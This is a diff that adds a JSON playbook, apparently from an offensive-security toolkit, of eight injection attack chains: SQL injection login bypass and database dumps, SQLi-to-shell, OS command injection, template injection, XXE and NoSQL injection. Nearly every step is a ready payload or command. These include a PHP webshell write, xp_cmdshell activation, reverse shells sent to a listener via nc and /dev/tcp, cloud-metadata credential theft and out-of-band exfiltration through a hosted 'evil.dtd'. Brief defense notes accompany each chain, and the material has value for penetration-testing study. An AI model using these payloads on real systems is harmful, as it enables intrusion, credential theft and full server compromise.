@@ -1,0 +1,422 @@
+{
+  "domain": "Injection",
+  "domainLabel": "Injection → RCE",
+  "domainOrder": 2,
+  "source": "ARS3NAL",
+  "chains": [
+    {
+      "title": "SQLi: authentication bypass with a single quote",
+      "level": "newbie",
+      "impact": "Log in as admin without a password.",
+      "why": "The most iconic SQLi payload and the fastest win on a legacy login form.",
+      "precondition": "A login form where the query is concatenated from input: SELECT * FROM users WHERE user='$u' AND pass='$p'.",
+      "tags": [
+        "sqli",
+        "auth-bypass",
+        "login"
+      ],
+      "realWorld": "OWASP SQLi auth-bypass; PortSwigger SQL injection labs.",
+      "defense": "Prepared statements + server-side password hashing (bcrypt/argon2); alert on OR '1'='1 in auth parameters.",
+      "steps": [
+        {
+          "title": "Try the username field",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "' OR '1'='1'-- -",
+          "success": "redirect to dashboard / session cookie issued"
+        },
+        {
+          "title": "Target a specific user",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "admin'-- -"
+        },
+        {
+          "title": "If it errors on multiple rows",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "admin' LIMIT 1-- -"
+        },
+        {
+          "title": "Run a bypass wordlist in Intruder",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "load 30+ variants (' or 1=1#, \") or (\"1\"=\"1, ...) when quotes/brackets differ"
+        },
+        {
+          "title": "The app compares a password hash",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "admin' AND 1=0 UNION SELECT 'admin','<md5(P@ssw0rd)>'-- -  (log in with a known plaintext)"
+        }
+      ]
+    },
+    {
+      "title": "SQLi: dumping the database via UNION",
+      "level": "newbie",
+      "impact": "Full database read (users, password hashes, PII, API keys), critical when PII is involved.",
+      "why": "UNION is the fastest and most visual way to turn a single reflected parameter into a full dump.",
+      "precondition": "A parameter whose value is reflected on the page (product id, search) where the query returns visible rows.",
+      "tags": [
+        "sqli",
+        "union",
+        "dump"
+      ],
+      "realWorld": "PortSwigger 'SQL injection UNION attacks'.",
+      "defense": "Parameterized queries; a WAF catches UNION SELECT and information_schema.",
+      "steps": [
+        {
+          "title": "Break the query",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "'  then  '-- -",
+          "success": "a 500 or 'error in your SQL syntax' appears/disappears"
+        },
+        {
+          "title": "Confirm the injection with boolean logic",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "id=1' AND 1=1-- -  (normal)  vs  id=1' AND 1=2-- -  (rows disappear)"
+        },
+        {
+          "title": "Count the columns",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "' ORDER BY 1-- -  ...increment until 'Unknown column N'"
+        },
+        {
+          "title": "Find a string/visible column",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "' UNION SELECT NULL,'AAA',NULL-- -  (wherever AAA is printed is your output channel)"
+        },
+        {
+          "title": "Extract the schema",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -"
+        },
+        {
+          "title": "Dump the credentials",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users-- -"
+        },
+        {
+          "title": "Automate it",
+          "kind": "command",
+          "q": "sqlmap",
+          "detail": "sqlmap -r req.txt -p id --technique=U --dump --batch"
+        }
+      ]
+    },
+    {
+      "title": "SQLi: blind extraction (boolean and time-based)",
+      "level": "intermediate",
+      "impact": "The same full database read, but through a parameter with no visible output.",
+      "why": "Most real-world SQLi is blind (login, cookie, headers, JSON), so binary search is the fundamental skill that separates a beginner from a hunter.",
+      "precondition": "An injection where the response is identical but behavior differs on true/false (boolean) or you can induce a delay (time).",
+      "tags": [
+        "sqli",
+        "blind",
+        "boolean",
+        "time-based"
+      ],
+      "realWorld": "PortSwigger 'Blind SQL injection'.",
+      "defense": "Parameterization; thousands of near-identical requests with SUBSTRING/ASCII or SLEEP are a clear WAF/IDS signal.",
+      "steps": [
+        {
+          "title": "Establish a true/false oracle",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "id=1 AND 1=1-- -  (page A)  vs  id=1 AND 1=2-- -  (page B)"
+        },
+        {
+          "title": "Extract by bisection (boolean)",
+          "kind": "script",
+          "q": "Boolean-based blind SQLi extractor",
+          "detail": "python3 sqli_boolean_blind.py -u 'https://t/item?id=1*' -m 'Welcome' -q '(SELECT password FROM users LIMIT 1)'  (~7 requests/char)"
+        },
+        {
+          "title": "If there's no content difference, prove it with time",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "' AND SLEEP(5)-- -  (MySQL)  /  '; WAITFOR DELAY '0:0:5'-- -  (MSSQL)"
+        },
+        {
+          "title": "Extract via timing",
+          "kind": "script",
+          "q": "Time-based blind SQLi extractor (multi-DBMS)",
+          "detail": "python3 sqli_time_blind.py -u 'https://t/item?id=1*' --dbms mysql -q 'user()' --delay 3"
+        },
+        {
+          "title": "OOB shortcut if egress is allowed",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "LOAD_FILE(CONCAT('\\\\\\\\',(SELECT pass FROM users LIMIT 1),'.id.oast.pro\\\\a'))  and watch interactsh"
+        },
+        {
+          "title": "Hand it off to the tool",
+          "kind": "command",
+          "q": "sqlmap",
+          "detail": "sqlmap ... --technique=BT  (or ghauri) for large dumps"
+        }
+      ]
+    },
+    {
+      "title": "SQLi → RCE: from injection to shell",
+      "level": "intermediate",
+      "impact": "Code execution on the database/web host (full server compromise).",
+      "why": "Escalating a data-only SQLi into RCE is the biggest impact multiplier; three paths are canonical (MySQL file write, MSSQL xp_cmdshell, PostgreSQL COPY PROGRAM).",
+      "precondition": "SQLi with high database privileges (FILE / sysadmin / superuser).",
+      "tags": [
+        "sqli",
+        "rce",
+        "mysql",
+        "mssql",
+        "postgresql"
+      ],
+      "realWorld": "PayloadsAllTheThings SQLi (INTO OUTFILE / xp_cmdshell / COPY PROGRAM).",
+      "defense": "Least-privilege database account (no FILE/sysadmin), secure_file_priv, disabled xp_cmdshell.",
+      "steps": [
+        {
+          "title": "Check privileges and the write path",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "SELECT current_setting('is_superuser')  /  SELECT is_srvrolemember('sysadmin')"
+        },
+        {
+          "title": "MySQL: webshell via INTO OUTFILE",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "... UNION SELECT \"<?php system($_GET['cmd']); ?>\" INTO OUTFILE '/var/www/html/x.php'  then /x.php?cmd=id"
+        },
+        {
+          "title": "MSSQL: enable and run xp_cmdshell",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE; then EXEC xp_cmdshell 'whoami'"
+        },
+        {
+          "title": "PostgreSQL: COPY FROM PROGRAM",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "COPY shell FROM PROGRAM 'id';  (superuser / pg_execute_server_program)"
+        },
+        {
+          "title": "Upgrade to a reverse shell",
+          "kind": "revshell",
+          "detail": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} 4444 >/tmp/f"
+        },
+        {
+          "title": "Single-command automation",
+          "kind": "command",
+          "q": "sqlmap",
+          "detail": "sqlmap -u '...' --technique=U --os-shell"
+        }
+      ]
+    },
+    {
+      "title": "OS Command Injection → reverse shell",
+      "level": "newbie",
+      "impact": "Arbitrary command execution and an interactive reverse shell on the host.",
+      "why": "Anywhere the app shells out (ping, DNS, image/PDF converters), this is a direct path to RCE.",
+      "precondition": "A feature that passes input to a system shell (ping -c4 $ip, convert, nslookup, export).",
+      "tags": [
+        "command-injection",
+        "rce",
+        "reverse-shell"
+      ],
+      "realWorld": "PortSwigger 'OS command injection'.",
+      "defense": "Shell-free exec-array APIs, strict allowlists; ;, |, $(, ${IFS}, sleep in parameters = high signal.",
+      "steps": [
+        {
+          "title": "Inject a separator",
+          "kind": "payload",
+          "q": "Command Injection",
+          "detail": "8.8.8.8; id   |   8.8.8.8 | id   |   8.8.8.8 && id",
+          "success": "uid=... in the response"
+        },
+        {
+          "title": "Inject inside the command",
+          "kind": "payload",
+          "q": "Command Injection",
+          "detail": "$(id)  /  `id`  when input lands in the middle of an argument"
+        },
+        {
+          "title": "If output is hidden, prove it blind",
+          "kind": "script",
+          "q": "Time-based command injection detector (separators x sleep)",
+          "detail": "python3 cmdi_time.py -u 'https://t/ping?host=127.0.0.1*' --base 127.0.0.1 --delay 5"
+        },
+        {
+          "title": "Bypass a space filter",
+          "kind": "payload",
+          "q": "Command Injection",
+          "detail": "cat${IFS}/etc/passwd   |   {cat,/etc/passwd}   |   cat</etc/passwd"
+        },
+        {
+          "title": "Bypass a keyword filter",
+          "kind": "payload",
+          "q": "Command Injection",
+          "detail": "w'h'o'am'i   |   who$@ami   |   /???/??t /???/p??s??"
+        },
+        {
+          "title": "Drop a reverse shell",
+          "kind": "revshell",
+          "detail": "bash -c 'bash -i >& /dev/tcp/{LHOST}/4444 0>&1'  (URL-encode)"
+        }
+      ]
+    },
+    {
+      "title": "SSTI → RCE: from ${7*7} to shell",
+      "level": "intermediate",
+      "impact": "Remote code execution on the application server.",
+      "why": "Template injection hides in name fields, PDF/invoice/email generators, and 'preview', and the detect-fingerprint-escalate pattern is the same across five engines.",
+      "precondition": "Input rendered back through a server-side template (greeting, email subject/body, a generated document).",
+      "tags": [
+        "ssti",
+        "rce",
+        "jinja2",
+        "twig",
+        "freemarker"
+      ],
+      "realWorld": "James Kettle 'Server-Side Template Injection' (Black Hat); Hackmanit template-injection-table.",
+      "defense": "Never render input as a template; sandbox the engine; {{, ${, __globals__ = strong signals.",
+      "steps": [
+        {
+          "title": "Arithmetic probe",
+          "kind": "payload",
+          "q": "Server Side Template Injection",
+          "detail": "{{7*7}}  /  ${7*7}  /  <%= 7*7 %>",
+          "success": "49 rendered = SSTI"
+        },
+        {
+          "title": "Fingerprint the engine",
+          "kind": "payload",
+          "q": "Server Side Template Injection",
+          "detail": "{{7*'7'}}  ->  7777777 = Jinja2,  49 = Twig"
+        },
+        {
+          "title": "Jinja2 RCE (Python)",
+          "kind": "payload",
+          "q": "Server Side Template Injection",
+          "detail": "{{ lipsum.__globals__['os'].popen('id').read() }}"
+        },
+        {
+          "title": "Twig RCE (PHP)",
+          "kind": "payload",
+          "q": "Server Side Template Injection",
+          "detail": "{{['id']|filter('system')}}"
+        },
+        {
+          "title": "Freemarker RCE (Java)",
+          "kind": "payload",
+          "q": "Server Side Template Injection",
+          "detail": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ ex('id') }"
+        },
+        {
+          "title": "Escalate to a reverse shell",
+          "kind": "command",
+          "q": "SSTImap / tplmap",
+          "detail": "sstimap -u 'http://t/?name=John' --os-shell"
+        }
+      ]
+    },
+    {
+      "title": "XXE: file read, SSRF, and blind OOB exfiltration",
+      "level": "intermediate",
+      "impact": "Arbitrary file read (secrets, source code, web.config), internal SSRF, OOB data theft (higher when cloud metadata is reachable).",
+      "why": "XML parsers are everywhere (SOAP, SAML, SVG/DOCX upload, REST that silently accepts XML), and a single DOCTYPE yields three different high-impact primitives.",
+      "precondition": "An endpoint that parses XML (or can be coerced to via Content-Type: application/xml) with external entities enabled.",
+      "tags": [
+        "xxe",
+        "file-read",
+        "ssrf",
+        "oob"
+      ],
+      "realWorld": "Yunusov 'XML Out-Of-Band Data Retrieval' (2013); PortSwigger XXE labs.",
+      "defense": "Disable DTD/external entities (disallow-doctype-decl); outbound to Collaborator, or file://, php://filter in XML is a signal.",
+      "steps": [
+        {
+          "title": "Confirm entity parsing",
+          "kind": "payload",
+          "q": "XXE Injection",
+          "detail": "<!ENTITY example \"Doe\">  and check whether it expanded in a reflected field"
+        },
+        {
+          "title": "Read a file",
+          "kind": "payload",
+          "q": "XXE Injection",
+          "detail": "<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
+          "success": "root:x:0:0 in the response"
+        },
+        {
+          "title": "Grab source via the PHP wrapper",
+          "kind": "payload",
+          "q": "XXE Injection",
+          "detail": "<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">"
+        },
+        {
+          "title": "Pivot to SSRF",
+          "kind": "payload",
+          "q": "XXE Injection",
+          "detail": "<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">"
+        },
+        {
+          "title": "Go blind OOB via an external DTD",
+          "kind": "script",
+          "q": "Blind XXE OOB exfil server (evil.dtd + base64 catcher)",
+          "detail": "host evil.dtd, point to <!DOCTYPE x SYSTEM \"http://you/evil.dtd\">, catch base64 on a listener"
+        }
+      ]
+    },
+    {
+      "title": "NoSQL injection: login bypass and blind extraction",
+      "level": "newbie",
+      "impact": "Logging in without a password and exfiltrating data field by field.",
+      "why": "Modern MEAN/MERN apps are full of MongoDB query objects, and swapping a value for an operator ($ne/$gt/$regex) is an easy, common bypass.",
+      "precondition": "Input reaches a MongoDB query filter and the parser accepts objects (JSON body or param[$op]= in form-urlencoded).",
+      "tags": [
+        "nosql",
+        "mongodb",
+        "auth-bypass"
+      ],
+      "realWorld": "PayloadsAllTheThings NoSQL Injection; Root Me 'NoSQL injection'.",
+      "defense": "Cast input to a string and reject objects/$-keys; alert on [$ne], $regex, $where, $gt in bodies.",
+      "steps": [
+        {
+          "title": "Login bypass (JSON)",
+          "kind": "payload",
+          "q": "NoSQL Injection",
+          "detail": "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
+          "success": "302 to the dashboard"
+        },
+        {
+          "title": "Login bypass (form-urlencoded)",
+          "kind": "payload",
+          "q": "NoSQL Injection",
+          "detail": "username[$ne]=x&password[$ne]=x"
+        },
+        {
+          "title": "Target a known admin",
+          "kind": "payload",
+          "q": "NoSQL Injection",
+          "detail": "{\"username\":{\"$in\":[\"admin\",\"administrator\",\"root\"]},\"password\":{\"$gt\":\"\"}}"
+        },
+        {
+          "title": "Blindly extract the password via $regex",
+          "kind": "payload",
+          "q": "NoSQL Injection",
+          "detail": "{\"username\":{\"$eq\":\"admin\"},\"password\":{\"$regex\":\"^m\"}}  grow the prefix on TRUE responses"
+        },
+        {
+          "title": "Automate the extraction",
+          "kind": "script",
+          "q": "MongoDB blind extractor ($regex char-by-char)",
+          "detail": "MongoDB blind extractor ($regex char by char)"
+        }
+      ]
+    }
+  ]
+}
